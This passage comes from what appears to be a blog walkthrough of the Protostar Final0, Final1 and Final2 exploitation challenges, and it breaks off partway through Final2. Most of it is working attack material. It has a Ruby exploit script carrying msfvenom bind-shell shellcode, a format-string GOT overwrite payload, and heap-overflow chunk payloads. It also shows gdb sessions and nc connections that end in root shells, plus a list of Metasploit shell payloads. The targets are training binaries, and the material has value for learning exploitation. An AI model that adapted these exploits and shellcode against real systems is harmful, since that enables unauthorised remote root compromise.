0x72413772: Error while running hook_stop:
Cannot access memory at address 0x72413772
0x72413772 in ?? ()</p>

<h1>window2:</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772
[*] Exact match at offset 532</p>

<h1>window1:</h1>

<p>gdb> i r
eax            0x804b008    0x804b008
ecx            0x0  0x0
edx            0x1  0x1
ebx            0x35724134   0x35724134
esp            0xbffff780   0xbffff780
ebp            0x41367241   0x41367241
esi            0x0  0x0
edi            0x0  0x0
eip            0x72413772   0x72413772
eflags         0x10286  [ PF SF IF RF ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33</p>

<p>gdb> x /x 0x804b008
0x804b008:  0x41304141
gdb> x /s 0x804b008
0x804b008:   &ldquo;AA0AA1AA2AA3AA4AA5AA6AA7AA8AA9AB0AB1AB2AB3AB4AB5AB6AB7AB8AB9AC0AC1AC2AC3AC4AC5AC6AC7AC8AC9AD0AD1AD2AD3AD4AD5AD6AD7AD8AD9AE0AE1AE2AE3AE4AE5AE6AE7AE8AE9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9AG0AG1AG2AG3AG4AG5AG&rdquo;&hellip;
{% endcodeblock %}</p>

<p>So EAX points at the beginning to the buffer and we are lucky, because there is also <code>call eax</code> in binary.
{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0
[final0]
0x08048d5f call eax
0x0804992b call eax
0x08054f4b call eax
0x08054f4b call eax
{% endcodeblock %}</p>

<p>We use <code>msfvenom</code> to generate bind shell, port <code>2449</code>, without newline characters and with uppercase encoding:</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo;
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 224 (iteration=0)
Payload size: 224 bytes
???t$?[SYIIICCCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQYKL7JCQCQS1CSZTBK9KQNPCV8MK01K1N1B3XC2C0C9LQ2J4PF160K9KQCZ560X8MK0K91QTDH3DDX02F8MK0PC80RFHMMPZ3V9RJWOV8HMK0PIT9KHCX6OVOT3RHRHVOCRU9BNMYM30PPSLIKQNPDKXMK0AA
{% endcodeblock %}</p>

<p>The lower case <code>t</code> at the beginning of the payload is used in order to find the payload&rsquo;s absolute location in memory and obtain a position-independent shellcode,
more <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>.</p>

<p>Because we can refer to this position also with the register <code>eax</code>, we can get rid of lower case character:</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo; BufferRegister=EAX
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 217 (iteration=0)
Payload size: 217 bytes
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIVQIKJWZC0SQS0S3Z4BK9M1X0CVHMMP1KQN1B3XER5P39J1RJTPV10PLIM1SZCVV88MMPMYW1S4H3ETH0BFHMMPPCNP3VHMK0MC69SZ7OF8XMMPW9BYKHSXFOFOSCSX3X6O52RI2NK9ZC0P63MYM1X04K8MMPAA
{% endcodeblock %}</p>

<p>Exploit:
{% codeblock language:ruby exploit-final0.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0</h1>

<h1>[final0]</h1>

<h1>0x08048d5f call eax</h1>

<h1>0x0804992b call eax</h1>

<h1>0x08054f4b call eax</h1>

<h1>0x08054f4b call eax</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772</h1>

<h1>[*] Exact match at offset 532</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo; BufferRegister=EAX -f ruby</h1>

<p>buf =
&ldquo;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a&rdquo; +
&ldquo;\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48&rdquo; +
&ldquo;\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51&rdquo; +
&ldquo;\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43&rdquo; +
&ldquo;\x4a\x4a\x49\x36\x51\x49\x4b\x4c\x37\x4a\x43\x36\x33\x50&rdquo; +
&ldquo;\x43\x56\x33\x43\x5a\x53\x32\x4d\x59\x4d\x31\x48\x30\x33&rdquo; +
&ldquo;\x56\x58\x4d\x4d\x50\x31\x4b\x31\x4e\x31\x42\x42\x48\x54&rdquo; +
&ldquo;\x42\x35\x50\x53\x39\x4a\x31\x32\x4a\x32\x30\x46\x31\x56&rdquo; +
&ldquo;\x30\x4c\x49\x4d\x31\x52\x4a\x42\x46\x30\x58\x58\x4d\x4b&rdquo; +
&ldquo;\x30\x4d\x59\x31\x51\x44\x44\x38\x33\x55\x54\x4e\x50\x32&rdquo; +
&ldquo;\x46\x38\x4d\x4d\x50\x30\x43\x4e\x50\x45\x36\x38\x4d\x4b&rdquo; +
&ldquo;\x30\x5a\x33\x36\x39\x53\x5a\x47\x4f\x50\x58\x48\x4d\x4b&rdquo; +
&ldquo;\x30\x31\x59\x32\x59\x4a\x58\x45\x38\x36\x4f\x56\x4f\x32&rdquo; +
&ldquo;\x53\x53\x58\x35\x38\x46\x4f\x45\x32\x53\x59\x32\x4e\x4d&rdquo; +
&ldquo;\x59\x4a\x43\x36\x30\x56\x33\x4b\x39\x4d\x31\x58\x30\x44&rdquo; +
&ldquo;\x4b\x58\x4d\x4b\x30\x41\x41&rdquo;</p>

<p>exploit = buf + &ldquo;A&rdquo; * (532 - buf.length)
exploit &lt;&lt; [0x08048d5f].pack(&ldquo;V&rdquo;)</p>

<p>host = ARGV[0]
host ||= &ldquo;192.168.80.154&rdquo;</p>

<p>puts &ldquo;Using host: #{host}&rdquo;</p>

<p>s = TCPSocket.new host, 2995
s.puts(exploit)
s.close
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ./exploit-final0.rb
Using host: 192.168.80.154</p>

<p>user@protostar:/tmp$ nc 0 2449
id
uid=0(root) gid=0(root) groups=0(root)
{% endcodeblock %}</p>

<h2>Protostar Final1</h2>

<p>{% codeblock lang:c final1.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>include &lt;syslog.h></h1>

<h1>define NAME &ldquo;final1&rdquo;</h1>

<h1>define UID 0</h1>

<h1>define GID 0</h1>

<h1>define PORT 2994</h1>

<p>char username[128];
char hostname[64];</p>

<p>void logit(char *pw)
{
  char buf[512];</p>

<p>  snprintf(buf, sizeof(buf), &ldquo;Login from %s as [%s] with password [%s]\n&rdquo;, hostname, username, pw);</p>

<p>  syslog(LOG_USER|LOG_DEBUG, buf);
}</p>

<p>void trim(char <em>str)
{
  char </em>q;</p>

<p>  q = strchr(str, &lsquo;\r&rsquo;);
  if(q) <em>q = 0;
  q = strchr(str, &lsquo;\n&rsquo;);
  if(q) </em>q = 0;
}</p>

<p>void parser()
{
  char line[128];</p>

<p>  printf(&ldquo;[final1] $ &rdquo;);</p>

<p>  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, &ldquo;username &rdquo;, 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, &ldquo;login &rdquo;, 6) == 0) {
          if(username[0] == 0) {
              printf(&ldquo;invalid protocol\n&rdquo;);
          } else {
              logit(line + 6);
              printf(&ldquo;login failed\n&rdquo;);
          }
      }
      printf(&ldquo;[final1] $ &rdquo;);
  }
}</p>

<p>void getipport()
{
  int l;
  struct sockaddr_in sin;</p>

<p>  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &amp;sin, &amp;l) == -1) {
      err(1, &ldquo;you don&rsquo;t exist&rdquo;);
  }</p>

<p>  sprintf(hostname, &ldquo;%s:%d&rdquo;, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  getipport();
  parser();</p>

<p>}
{% endcodeblock %}</p>

<p>We don&rsquo;t use spaces to find our format string to have more spaces left for
exploit. Also, both <code>username</code> and <code>login</code> parameters are vulnerable, we use
<code>username</code> to store shellcode and <code>login</code> for overwriting <code>GOT entry</code> for
<code>puts()</code>. The line with timestamp is the entry from <code>/var/log/syslog</code> file.</p>

<p>{% codeblock %}
user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%p&rdquo; * 70 + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ login failed
Jun 26 17:24:42 (none) final1: Login from 127.0.0.1:54427 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612037320x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x434343430x6977205d0x702068740x777373610x2064726f0x2570255b0x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x25702570]</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%p&rdquo; * 43 + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ login failed
Jun 26 17:26:22 (none) final1: Login from 127.0.0.1:54434 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612034330x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x43434343]</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$p%43\$p&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ login failed
Jun 26 17:27:21 (none) final1: Login from 127.0.0.1:54435 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x424242420x43434343]
{% endcodeblock %}</p>

<p>We have 109 bytes for shellcode, not much but it should be sufficient.</p>

<p>{% codeblock %}
root@protostar:/tmp# objdump -t /opt/protostar/bin/final1  | grep username
0804a220 g     O .bss   00000080              username</p>

<p>user@protostar:/tmp$ objdump -TR /opt/protostar/bin/final1 | grep puts
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   puts
0804a194 R_386_JUMP_SLOT   puts
{% endcodeblock %}</p>

<p>In order to pass this challenge, we need to store the address <code>0x0804a220</code> to
<code>0x0804a194</code>. Our <code>formatter.rb</code> is the same script as in the <code>protostar format</code>
challenges.</p>

<p>{% codeblock %}
user@protostar:/tmp$ ruby1.9.1 ./formatter.rb 42:0x0804a194:0x0804a220
ruby -e &lsquo;print [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;) + &ldquo;%42\$2044x%42\$hn%43\$39452x%43\$hn&rdquo;&rsquo;
{% endcodeblock %}</p>

<p>Exploitation process:
{% codeblock %}</p>

<h1>window1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set detach-on-fork off&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;run&rsquo; /opt/protostar/bin/final1
Reading symbols from /opt/protostar/bin/final1&hellip;done.
Starting program: /opt/protostar/bin/final1
[New process 29349]
[New process 29352]</p>

<h1>window2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$2044x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ ^C</p>

<h1>window1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 29352]
0x08a1a2bd in ?? ()</p>

<p>(gdb) x /x 0x0804a194
0x804a194 &lt;<em>GLOBAL_OFFSET_TABLE</em>+168>:  0x08a1a2bd
{% endcodeblock %}</p>

<p>So, we have <code>0x08a1a2bd</code> instead of <code>0x0804a220</code>, let&rsquo;s see the difference:
{% codeblock %}
0x08a1-0x0804 = 157
0xa2bd-0xa220 = 157
{% endcodeblock %}</p>

<p>Substracting <code>157</code> from <code>2044</code>, we got <code>1887</code> and that is the correct value, which we will use. Another try:</p>

<p>{% codeblock %}</p>

<h1>window1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set detach-on-fork off&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;run&rsquo; /opt/protostar/bin/final1
Reading symbols from /opt/protostar/bin/final1&hellip;done.
Starting program: /opt/protostar/bin/final1
[New process 29370]
[New process 29373]</p>

<h1>window2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$1887x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ ^C</p>

<h1>window1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 29373]
0x0804a28e in username ()
(gdb) x /x 0x0804a194
0x804a194 &lt;<em>GLOBAL_OFFSET_TABLE</em>+168>:  0x0804a220
{% endcodeblock %}</p>

<p>That&rsquo;s correct, now we need to generate payload not longer than 109 bytes:</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/tools/payload_lengths.rb | awk &lsquo; $2&lt;=100&rsquo; | grep &lsquo;linux/x86&rsquo;
    linux/x86/adduser                                   97
    linux/x86/chmod                                     36
    linux/x86/exec                                      36
    linux/x86/meterpreter/bind_ipv6_tcp                 85
    linux/x86/meterpreter/bind_nonx_tcp                 63
    linux/x86/meterpreter/find_tag                      37
    linux/x86/meterpreter/reverse_ipv6_tcp              77
    linux/x86/meterpreter/reverse_nonx_tcp              50
    linux/x86/read_file                                 62
    linux/x86/shell/bind_ipv6_tcp                       85
    linux/x86/shell/bind_nonx_tcp                       63
    linux/x86/shell/find_tag                            37
    linux/x86/shell/reverse_ipv6_tcp                    77
    linux/x86/shell/reverse_nonx_tcp                    50
    linux/x86/shell_bind_ipv6_tcp                       90
    linux/x86/shell_bind_tcp                            78
    linux/x86/shell_bind_tcp_random_port                57
    linux/x86/shell_find_port                           62
    linux/x86/shell_find_tag                            69
    linux/x86/shell_reverse_tcp                         68
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2450 -b &lsquo;\x0a\x0d\x00&rsquo; -f sh
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 22 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 105 (iteration=0)
Payload size: 105 bytes
export buf=\
$&lsquo;\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9&rsquo;\
$&lsquo;\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66&rsquo;\
$&lsquo;\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b&rsquo;\
$&lsquo;\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54&rsquo;\
$&lsquo;\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48&rsquo;\
$&lsquo;\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12&rsquo;\
$&lsquo;\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68&rsquo;\
$&lsquo;\xd8\x45\xbb\x38\xd5\x98\xbc&rsquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ export buf=\</p>

<blockquote><p>$&lsquo;\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9&rsquo;\
$&lsquo;\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66&rsquo;\
$&lsquo;\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b&rsquo;\
$&lsquo;\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54&rsquo;\
$&lsquo;\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48&rsquo;\
$&lsquo;\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12&rsquo;\
$&lsquo;\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68&rsquo;\
$&lsquo;\xd8\x45\xbb\x38\xd5\x98\xbc&rsquo;</p></blockquote>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + ENV[&ldquo;buf&rdquo;] + &ldquo;A&rdquo; * (109-105) + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$1887x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ ^C
user@protostar:/tmp$ nc 0 2450
id
uid=0(root) gid=0(root) groups=0(root)
{% endcodeblock %}</p>

<h2>Protostar Final2</h2>

<p>{% codeblock lang:c final2.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>include &ldquo;../common/malloc.c&rdquo;</h1>

<h1>define NAME &ldquo;final2&rdquo;</h1>

<h1>define UID 0</h1>

<h1>define GID 0</h1>

<h1>define PORT 2993</h1>

<h1>define REQSZ 128</h1>

<p>void check_path(char <em>buf)
{
  char </em>start;
  char *p;
  int l;</p>

<p>  /<em>
  * Work out old software bug
  </em>/</p>

<p>  p = rindex(buf, &lsquo;/&rsquo;);
  l = strlen(p);
  if(p) {
      start = strstr(buf, &ldquo;ROOT&rdquo;);
      if(start) {
          while(*start != &lsquo;/&rsquo;) start&ndash;;
          memmove(start, p, l);
          printf(&ldquo;moving from %p to %p (exploit: %s / %d)\n&rdquo;, p, start, start &lt; buf ?  &ldquo;yes&rdquo; : &ldquo;no&rdquo;, start - buf);
      }
  }
}</p>

<p>int get_requests(int fd)
{
  char <em>buf;
  char </em>destroylist[256];
  int dll;
  int i;</p>

<p>  dll = 0;
  while(1) {
      if(dll >= 255) break;</p>

<pre><code>  buf = calloc(REQSZ, 1);
  if(read(fd, buf, REQSZ) != REQSZ) break;

  if(strncmp(buf, "FSRD", 4) != 0) break;

  check_path(buf + 4);     

  dll++;
</code></pre>

<p>  }</p>

<p>  for(i = 0; i &lt; dll; i++) {
                write(fd, &ldquo;Process OK\n&rdquo;, strlen(&ldquo;Process OK\n&rdquo;));
      free(destroylist[i]);
  }
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  get_requests(fd);</p>

<p>}
{% endcodeblock %}</p>

<p>The vulnerability is in this part of the source:
{% codeblock lang:c %}
  p = rindex(buf, &lsquo;/&rsquo;);
  l = strlen(p);</p>

<p>  if(p) {
      start = strstr(buf, &ldquo;ROOT&rdquo;);
      if(start) {
          while(*start != &lsquo;/&rsquo;) start&ndash;;
          memmove(start, p, l);
          printf(&ldquo;moving from %p to %p (exploit: %s / %d)\n&rdquo;, p, start, start &lt; buf ?  &ldquo;yes&rdquo; : &ldquo;no&rdquo;, start - buf);
      }
  }
{% endcodeblock %}</p>

<p>It expects message with the content <code>..../..ROOT.../next</code>, look for the rightmost <code>/</code>,
then searching for string <code>ROOT</code> and going leftside, it finds another <code>/</code>.</p>

<p>Finally, it copies <code>/next</code> after the left <code>/</code>, before <code>ROOT</code> and creates <code>..../next\x00T...</code></p>

<p>We need at least one slash, because <code>strlen(NULL)</code> segfaults. The security issue
is that if we don&rsquo;t set left slash, it continues to the left through different
chunk, for example:</p>

<p>{% codeblock %}
1st chunk: &ldquo;FSRD&rdquo; + &ldquo;0&rdquo; * 123 + &ldquo;/&rdquo;
2nd chunk: &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + &ldquo;X&rdquo; * 103
3rd chunk: &ldquo;XXXX&rdquo;
{% endcodeblock %}</p>

<p>In this case we copy everything after <code>ROOT/</code> to the 1st chunk and overwrite the chunk metadata, so we have classic heap overflow.</p>

<p>To verify our concept, we attach to the final2 process as root user:</p>

<p>{% codeblock %}</p>

<h1>window 1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;0&rdquo; * 123 +&ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + &ldquo;X&rdquo; * 107&rsquo; | nc 0 2993</p>

<h1>window 1:</h1>

<p>[New process 2405]</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2405]
_______________________________________Current language:  auto
The current source language is &ldquo;auto; currently c&rdquo;.</p>

<hr />

<pre><code> eax:41414141 ebx:B7FD7FF4  ecx:0804C2D6  edx:42424242     eflags:00010246
 esi:00000000 edi:00000000  esp:BFFFF7E0  ebp:BFFFF828     eip:0804AAEF
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</code></pre>

<p>[007B:BFFFF7E0]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF810 : 42 42 42 42  41 41 41 41 - 18 E1 04 08  18 E1 04 08 BBBBAAAA&hellip;&hellip;..
BFFFF800 : 88 E0 04 08  FC FF FF FF - 00 00 00 00  10 E1 04 08 &hellip;&hellip;&hellip;&hellip;&hellip;.
BFFFF7F0 : 00 D5 04 08  00 E0 04 08 - 88 00 00 00  45 BD 04 08 &hellip;&hellip;&hellip;&hellip;E&hellip;
BFFFF7E0 : 00 00 00 00  00 00 00 00 - 28 F8 FF BF  68 B5 04 08 &hellip;&hellip;..(&hellip;h&hellip;
[007B:41414141]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
41414141 : Error while running hook_stop:
Cannot access memory at address 0x41414141
0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
3648    final2/../common/malloc.c: No such file or directory.
    in final2/../common/malloc.c</p>

<p>gdb> i r eax edx
eax            0x41414141   0x41414141
edx            0x42424242   0x42424242</p>

<p>gdb> x /i $eip
0x804aaef &lt;free+301>:   mov    DWORD PTR [eax+0xc],edx</p>

<p>gdb> x /50x 0x804e010
0x804e010:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e020:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e030:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e040:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e050:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e060:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e070:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e080:  0x30303030  0x2f303030  0xfffffff8  0xfffffffc
0x804e090:  0x41414141  0x42424242  0x58585858  0x58585858
0x804e0a0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0b0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0c0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0d0:  0x58585858  0x58585858</p>

<p>{% endcodeblock %}</p>

<p>We use <code>GOT</code> technique, modifing <code>write</code> and the shellcode will be stored in our first chunk (<code>0x804e010</code>).</p>

<p>{% codeblock %}
root@protostar:/tmp# objdump -TR /opt/protostar/bin/final2 | grep &ldquo;R_386_JUMP_SLOT.* write&rdquo;
0804d41c R_386_JUMP_SLOT   write</p>

<p>(gdb) print /x 0x0804d41c-0x0c
$1 = 0x804d410
{% endcodeblock %}</p>

<p>So we need to write <code>0x804e010</code> to <code>0x804d41c</code>.</p>

<p>To check where are usable data in our buffer, we use metasploit pattern:</p>

<p>{% codeblock %}</p>

<h1>window 1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0&rdquo; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; * 107&rsquo; | nc 0 2993</p>

<h1>window 1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2427]</p>

<hr />

<pre><code> eax:B7FFEFF4 ebx:B7FE1848  ecx:FFFFFFFF  edx:0013F1CC     eflags:00010286
 esi:BFFFF91C edi:00000001  esp:BFFFF8AC  ebp:B7FEBFC6     eip:0804E026
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</code></pre>

